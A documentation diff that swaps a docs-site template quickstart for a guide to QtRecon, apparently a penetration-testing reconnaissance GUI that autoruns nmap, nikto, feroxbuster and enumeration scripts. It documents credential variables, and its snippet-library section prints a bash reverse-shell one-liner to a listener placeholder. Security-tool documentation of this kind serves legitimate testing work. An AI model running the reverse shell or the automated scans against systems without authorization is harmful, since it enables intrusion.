@@ -1,80 +1,220 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+title: Quickstart
+description: Get started with QtRecon in minutes and run your first automated reconnaissance scan
 ---
 
-## Get started in three steps
+This guide will walk you through launching QtRecon and running your first automated reconnaissance scan with intelligent tool execution.
 
-Get your documentation site running locally and make your first customization.
+## Prerequisites
 
-### Step 1: Set up your local environment
+Before starting, ensure you have:
+- Python 3.7 or higher installed
+- Pipenv installed (`pip install pipenv`)
+- Nmap installed on your system
+- A target network or IP address to scan
 
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
+<Note>
+  QtRecon comes with sensible defaults, so you can start scanning immediately. Advanced configuration can be done later through the GUI or by editing the configuration file.
+</Note>
+
+## Launch QtRecon
+
+<Steps>
+  <Step title="Start the application">
+    Navigate to the QtRecon directory and launch the application:
     
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
+    ```bash
+    cd qtrecon
+    pipenv run python qtrecon.py
+    ```
     
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 2: Deploy your changes
-
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
+    The main window will appear with the host list on the left and an empty workspace ready for your first scan.
+  </Step>
+  
+  <Step title="Create a new scan">
+    To start scanning a target:
     
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
+    1. Press **Ctrl+H** or click **Scan → New scan** from the menu
+    2. Enter your target (IP address, hostname, or CIDR range)
+    3. Configure scan options:
+       - **Port range**: Default is `T:-,U:53,161,631` (all TCP ports, select UDP ports)
+       - **Scan type**: `-sS` for SYN scan (requires root) or `-sT` for connect scan
+       - **Additional arguments**: Add options like `-v --min-rate 500` for faster scanning
+    4. Click **Start** to begin the scan
+    
+    <Tip>
+      For privileged scans (SYN scan, OS detection), QtRecon will automatically use `pkexec` or your configured privilege escalation tool.
+    </Tip>
+  </Step>
+  
+  <Step title="Watch automatic tool execution">
+    As nmap discovers open ports, QtRecon automatically launches configured tools based on your autorun rules.
+    
+    Example autorun behavior from the default configuration:
+    
+    **Port 80 (HTTP) discovered:**
+    ```bash
+    # Automatically launches:
+    feroxbuster -n -k -e --thorough -B --no-state -C 404,400 \
+      --url http://192.168.1.10:80/ \
+      -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
+    
+    nikto --host 192.168.1.10 --port 80
+    ```
+    
+    **Port 445 (SMB) discovered:**
+    ```bash
+    # Automatically launches:
+    bash scripts/smb.sh 192.168.1.10
+    ```
+    
+    All tool output is captured in real-time and displayed in dedicated tabs for each host.
+  </Step>
+  
+  <Step title="Review results">
+    Results are organized in the interface:
+    
+    - **Hosts tab**: All discovered hosts with their operating system and open ports
+    - **Services tab**: Port-centric view showing all hosts with a specific service
+    - **Application tabs**: Each host has tabs for Ports, Nmap output, Credentials, and tool results
+    - **Jobs tab**: Monitor running, completed, and failed tool executions
+    
+    Click on any host in the left panel to view its details in the right panel.
+  </Step>
+  
+  <Step title="Save your workspace">
+    Save your reconnaissance session to resume later:
+    
+    - **Quick save**: Press **Ctrl+S** to save to the current file
+    - **Save as**: Press **Ctrl+Alt+S** to save to a new SQLite database file
+    
+    Workspaces preserve all hosts, ports, tool outputs, credentials, notes, and job history.
+  </Step>
+</Steps>
 
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
+## Understanding autorun
 
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
+QtRecon's autorun feature is what makes reconnaissance truly automated. When nmap discovers an open port, QtRecon checks the autorun configuration and launches matching tools.
 
-### Step 3: Go live
+### Default autorun configuration
 
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
+The default `conf.json.example` includes autorun rules like:
+
+```json
+{
+  "autorun": {
+    "tcp": {
+      "any": ["nuclei"],
+      "80": ["feroxbuster", "nikto"],
+      "443": ["feroxbuster_https", "nikto_https"],
+      "445": ["smb_script"],
+      "3306": ["mysql_script"]
+    },
+    "udp": {
+      "161": ["snmp_script"]
+    }
+  }
+}
+```
+
+This means:
+- **Any TCP port**: Run nuclei for vulnerability scanning
+- **Port 80/443**: Run web directory brute-forcing and web vulnerability scanning
+- **Port 445**: Run SMB enumeration scripts
+- **Port 3306**: Run MySQL enumeration
+
+<Warning>
+  Autorun tools execute automatically without confirmation. Review your autorun configuration to ensure only safe, non-intrusive tools run automatically. Aggressive tools should be launched manually from the port associations menu.
+</Warning>
+
+## Using variables
+
+QtRecon supports variable substitution in tool commands. Variables are automatically replaced at runtime:
+
+### Built-in variables
+
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `%%%IP%%%` | Target IP address | `192.168.1.10` |
+| `%%%PORT%%%` | Port number | `80` |
+| `%%%PROTO%%%` | Protocol (http/https) | `http` |
+| `%%%HOSTNAME%%%` | Target hostname | `server.example.com` |
+| `%%%LHOST%%%` | Your local IP | `192.168.1.5` |
+| `%%%LPORT%%%` | Your listener port | `4444` |
+
+### Credential variables
+
+If you've added credentials for a host, these variables become available:
+
+- `%%%DOMAIN%%%` - Windows domain
+- `%%%USERNAME%%%` - Username
+- `%%%PASSWORD%%%` - Password
+- `%%%HASH%%%` - NTLM hash
+
+Example tool using credentials:
+
+```json
+{
+  "name": "SMB authenticated enum",
+  "binary": "/bin/bash",
+  "args": ["scripts/smb.sh", "%%%IP%%%", "%%%DOMAIN%%%", 
+           "%%%USERNAME%%%", "%%%PASSWORD%%%"]
+}
+```
+
+When you launch this tool, QtRecon prompts you to select which credentials to use if multiple sets exist for the host.
+
+## Accessing the snippet library
+
+QtRecon includes a built-in snippet library with reverse shells, privilege escalation commands, and common payloads:
+
+1. Click the **Snippets** tab in the main work area
+2. Browse categories (Reverse shells, Linux, Windows)
+3. Snippets use `%%%LHOST%%%` and `%%%LPORT%%%` variables which are replaced with your configured local IP and port
+
+Example snippet (Bash reverse shell):
+
+```bash
+bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1
+```
+
+These variables are configured in **Edit → Edit custom variables** or in `user_prefs` section of the configuration.
 
 ## Next steps
 
-Now that you have your docs running, explore these key features:
-
 <CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
+  <Card title="Configure tools" icon="screwdriver-wrench" href="/guides/custom-tools">
+    Add your favorite security tools and customize their arguments
+  </Card>
+  <Card title="Automation rules" icon="wand-magic-sparkles" href="/guides/automation-rules">
+    Set up intelligent autorun rules for different services
+  </Card>
+  <Card title="Configuration system" icon="gear" href="/concepts/configuration-system">
+    Learn about QtRecon's flexible JSON configuration
+  </Card>
+  <Card title="Credentials" icon="key" href="/guides/managing-credentials">
+    Track and use discovered credentials in your tools
+  </Card>
 </CardGroup>
 
-<Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
-</Note>
+## Tips for effective reconnaissance
+
+<Accordion title="Start with conservative autorun">
+  Begin with only safe, passive tools in your autorun configuration. Add aggressive tools (like brute-forcing) manually after understanding the target.
+</Accordion>
+
+<Accordion title="Use workspace autosave">
+  Enable autosave in **Options → Autosave database every 5 mins** to prevent data loss during long reconnaissance sessions.
+</Accordion>
+
+<Accordion title="Import existing nmap scans">
+  Already have nmap XML files? Import them with **File → Import XML file** (Ctrl+I). QtRecon will parse the results and trigger autorun rules.
+</Accordion>
+
+<Accordion title="Take screenshots automatically">
+  Enable the screenshot module to automatically capture your screen every few seconds. This helps document your findings and provides evidence for reports.
+</Accordion>
+
+<Accordion title="Organize with workspaces">
+  Create separate workspace files for different engagements or targets. Workspaces are portable SQLite databases that can be backed up or shared.
+</Accordion>
